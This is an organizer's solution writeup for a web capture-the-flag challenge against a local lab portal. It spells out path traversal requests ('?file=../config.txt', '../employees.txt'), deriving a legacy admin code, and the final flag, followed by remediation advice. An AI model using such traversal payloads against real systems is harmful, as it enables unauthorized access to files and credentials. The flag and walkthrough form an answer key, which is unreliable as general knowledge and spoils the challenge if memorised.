# Official Solution & Organizer Writeup: The Hidden Parameter

**Challenge Name:** The Hidden Parameter  
**Category:** Web  
**Difficulty:** Moderate  
**Estimated Time:** 20–45 minutes  
**Flag:** `OWASP{you_found_what_was_never_removed}`  

---

## Challenge Summary

"The Hidden Parameter" is a multi-step web security challenge based on arbitrary file reading / directory traversal and information leakage left behind after a flawed corporate migration.

Players identify an unsanitized file inclusion parameter in a document viewing service, escape the document folder to inspect internal configuration and employee rosters, deduce the identity of the legacy systems administrator from contextual portal hints, formulate the legacy authentication token, and log into a forgotten administrative console.

---

## Intended Solve Walkthrough

### Step 1: Visit the Homepage
Navigate to the root URL:
```text
http://127.0.0.1:5000/
```
The user is greeted by a polished corporate employee portal for **Nova Systems**, featuring portal cards, system status indicators, and an action button labelled `[ View Documents ]`.

### Step 2: Inspect the Source and Discover Document Functionality
Inspect the page HTML using browser Developer Tools (`Ctrl+U` or `F12`):
- Notice the link to the document service: `/reports?file=welcome.txt`.
- Notice the HTML comment clue:
  ```html
  <!-- legacy document service v1.8 active - migration review by Engineering lead D. Brooks -->
  ```
- Additionally, on the homepage under "Technical Administration", Daniel Brooks is listed as the Engineering lead responsible for legacy system maintenance.

### Step 3: Access the Report Endpoint
Navigate to:
```text
http://127.0.0.1:5000/reports?file=welcome.txt
```
The page renders the contents of `reports/welcome.txt`:
```text
Nova Systems Employee Resource Portal

Welcome to the employee resource system.

For internal documentation or account issues,
please contact the administration team.
```

### Step 4: Identify the Vulnerable `file` Parameter
The URL parameter `?file=welcome.txt` directly requests files from the server's local file store. Test modifying the parameter with invalid input:
```text
http://127.0.0.1:5000/reports?file=nonexistent.txt
```
The server responds with a 404 message: `Document not found.`, indicating that the file parameter directly controls backend filesystem lookups.

### Step 5: Use Path Traversal to Read `config.txt`
Test standard directory traversal sequences using `../` to access files in the application root directory:
```text
http://127.0.0.1:5000/reports?file=../config.txt
```
The server returns the unlinked legacy configuration file:
```text
Nova Systems Legacy Configuration

Application: Nova Employee Portal
Version: 2.1

Legacy administration interface:
 /legacy-console

Authentication method:
 employee-id + joining-year

NOTE:
This authentication method was scheduled for removal
during the migration.
```

### Step 6: Discover `/legacy-console`
The configuration discloses two crucial pieces of information:
1. The endpoint for the un-decommissioned legacy administration console: `/legacy-console`.
2. The authentication logic formula: `employee-id + joining-year`.

Visiting `http://127.0.0.1:5000/legacy-console` displays a vintage enterprise administration login prompt requesting an **Employee Code**.

### Step 7: Use Path Traversal to Read `employees.txt`
To find the valid employee ID and joining year, test enumerating standard corporate file names or check the employee directory:
```text
http://127.0.0.1:5000/reports?file=../employees.txt
```
The server returns the employee directory:
```text
NOVA SYSTEMS — EMPLOYEE DIRECTORY

Employee: Sarah Mitchell
Department: Human Resources
Employee ID: 0314
Joined: 2023

Employee: Daniel Brooks
Department: Engineering
Employee ID: 0471
Joined: 2022

Employee: Maya Patel
Department: Finance
Employee ID: 0588
Joined: 2024

Employee: Ethan Cole
Department: Infrastructure
Employee ID: 0621
Joined: 2021
```

### Step 8: Identify the Relevant Administrator
Reviewing the contextual hints discovered during reconnaissance:
- The portal's migration notice and technical administration card note that the legacy systems and migration were led by the **Engineering** department, specifically **Daniel Brooks**.
- The HTML comment references `Engineering lead D. Brooks`.
- In `employees.txt`, **Daniel Brooks** is the only member of Engineering:
  - **Employee ID:** `0471`
  - **Joined:** `2022`

### Step 9: Combine Employee ID and Joining Year
Following the authentication rule from `config.txt`:
```text
Authentication method: employee-id + joining-year
Employee ID: 0471
Joining Year: 2022

Derived Code: 04712022
```

### Step 10: Enter `04712022` into the Legacy Console
1. Navigate to:
   ```text
   http://127.0.0.1:5000/legacy-console
   ```
2. Enter `04712022` into the **Employee Code** input field and click **Verify**.

### Step 11: Retrieve the Flag
The console validates the code and outputs:
```text
LEGACY ADMINISTRATION CONSOLE

Authentication successful.

Migration status:
INCOMPLETE

Old administrative system:
STILL ACTIVE

Security audit result:
CRITICAL

FLAG:
OWASP{you_found_what_was_never_removed}
```

---

## Vulnerability Analysis & Remediation

### 1. Arbitrary File Read / Path Traversal (CWE-22 / CWE-23)
* **Vulnerable Pattern:** Directly concatenating untrusted user input into filesystem operations (`os.path.join(REPORTS_DIR, filename)`) without input validation or safe basename extraction.
* **Remediation:**
  - Whitelist allowed file identifiers instead of accepting raw filenames or paths.
  - If dynamic filenames must be accepted, sanitize input using `os.path.basename(filename)` or `werkzeug.utils.secure_filename(filename)`.
  - Validate that the canonical path strictly resides inside the allowed directory:
    ```python
    safe_path = os.path.abspath(os.path.join(REPORTS_DIR, os.path.basename(filename)))
    if not safe_path.startswith(os.path.abspath(REPORTS_DIR)):
        abort(403)
    ```

### 2. Insecure Legacy Endpoints & Flawed Deprecation
* **Vulnerable Pattern:** Relying on security through obscurity by unlinking `/legacy-console` without disabling route handlers or revoking legacy authentication mechanisms.
* **Remediation:** Remove legacy route handlers, decommission outdated endpoints, and implement centralized role-based access control (RBAC) with modern multi-factor authentication.
